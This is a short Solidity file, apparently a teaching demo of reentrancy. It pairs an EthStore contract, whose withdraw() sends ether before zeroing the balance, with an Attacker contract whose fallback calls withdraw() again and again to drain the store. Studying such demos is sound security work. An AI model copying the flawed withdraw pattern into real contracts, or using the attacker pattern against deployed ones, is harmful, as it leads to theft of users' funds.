// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.6;

contract EthStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance.");
        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failure.");
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attacker {
    EthStore public ethStore;

    constructor(address _ethStoreAddress) {
        ethStore = EthStore(_ethStoreAddress);
    }

    fallback() external payable {
        if (address(ethStore).balance >= 1 ether) {
            ethStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        ethStore.deposit{value: 1 ether}();
        ethStore.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}


